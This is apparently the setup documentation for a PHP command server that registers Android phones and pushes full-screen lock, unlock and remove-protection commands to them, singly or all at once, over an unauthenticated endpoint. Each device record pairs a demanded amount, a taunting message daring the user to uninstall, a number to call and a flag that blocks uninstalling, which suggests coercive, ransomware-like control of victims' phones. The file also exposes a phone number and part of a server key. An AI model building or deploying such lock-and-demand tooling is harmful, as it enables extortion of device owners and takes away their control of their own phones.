# PHP Server Documentation

## Server Location
```
https://api.miniclickcrm.com/admin/
```

## Files to Upload
Upload all files from the `phpserver/` folder to your server's `/admin/` directory.

---

## File: check.php

**Purpose:** Device registration & status check

**Location:** `phpserver/check.php`

### Endpoint
```
GET https://api.miniclickcrm.com/admin/check.php
```

### Parameters
| Parameter | Required | Description |
|-----------|----------|-------------|
| `pairingcode` | Yes | Device pairing code (e.g., 1120) |
| `fcm_token` | No | Firebase Cloud Messaging token from device |

### Example Request
```
https://api.miniclickcrm.com/admin/check.php?pairingcode=1120&fcm_token=xxxxx
```

### Response
```json
{
  "success": true,
  "pairingcode": "1120",
  "data": {
    "amount": 2000,
    "message": "Uninstall Karke Dikha",
    "is_freezed": true,
    "call_to": "9068062563",
    "is_protected": true
  },
  "token_registered": true
}
```

### Device Configuration
Edit the `$devices` array in `check.php`:
```php
$devices = [
    "1120" => [
        "amount" => 2000,
        "message" => "Your custom message",
        "is_freezed" => true,      // true = device locked
        "call_to" => "9068062563", // Manager phone number
        "is_protected" => true      // true = can't uninstall
    ],
];
```

---

## File: pushchanges.php

**Purpose:** Send push notifications to devices

**Location:** `phpserver/pushchanges.php`

### Endpoint
```
GET https://api.miniclickcrm.com/admin/pushchanges.php
```

### Parameters
| Parameter | Required | Description |
|-----------|----------|-------------|
| `command` | Yes | Command to execute |
| `pairingcode` | No* | Target device (*required if not using `all=1`) |
| `all` | No | Set to `1` to push to ALL devices |
| `duration` | No | Minutes for TEMPORAL_UNLOCK |
| `message` | No | Custom message |

### Available Commands

| Command | Effect |
|---------|--------|
| `LOCK_DEVICE` | Shows full-screen lock |
| `UNLOCK_DEVICE` | Dismisses lock screen |
| `TEMPORAL_UNLOCK` | Unlocks for X minutes |
| `REMOVE_PROTECTION` | Removes admin, allows uninstall |

### Usage Examples

**Lock Single Device:**
```
pushchanges.php?command=LOCK_DEVICE&pairingcode=1120
```

**Lock ALL Devices:**
```
pushchanges.php?command=LOCK_DEVICE&all=1
```

**Unlock Device:**
```
pushchanges.php?command=UNLOCK_DEVICE&pairingcode=1120
```

**Temporal Unlock (2 hours):**
```
pushchanges.php?command=TEMPORAL_UNLOCK&pairingcode=1120&duration=120
```

**Remove Protection:**
```
pushchanges.php?command=REMOVE_PROTECTION&pairingcode=1120
```

### Response
```json
{
  "success": true,
  "command": "LOCK_DEVICE",
  "results": {
    "1120": {
      "sent": true,
      "fcm_response": { "success": 1, "failure": 0 }
    }
  }
}
```

---

## File: device_tokens.json

**Purpose:** Stores FCM tokens for registered devices

**Location:** `phpserver/device_tokens.json`

**Auto-generated** when devices register. Example content:
```json
{
  "1120": {
    "fcm_token": "dXq7xK3h...",
    "last_updated": "2026-01-09 14:30:00",
    "device_data": {
      "amount": 2000,
      "message": "...",
      "is_freezed": true,
      "call_to": "9068062563",
      "is_protected": true
    }
  }
}
```

---

## Server Setup

### File Permissions
```bash
chmod 644 check.php pushchanges.php
chmod 666 device_tokens.json
```

### FCM Server Key
Located in `pushchanges.php`:
```php
$FCM_SERVER_KEY = "BIyja-rwC_fVBBad0cO81AR2...";
```

### Security Recommendations
1. Add authentication to `pushchanges.php`
2. Restrict access by IP whitelist
3. Use HTTPS only
4. Add rate limiting
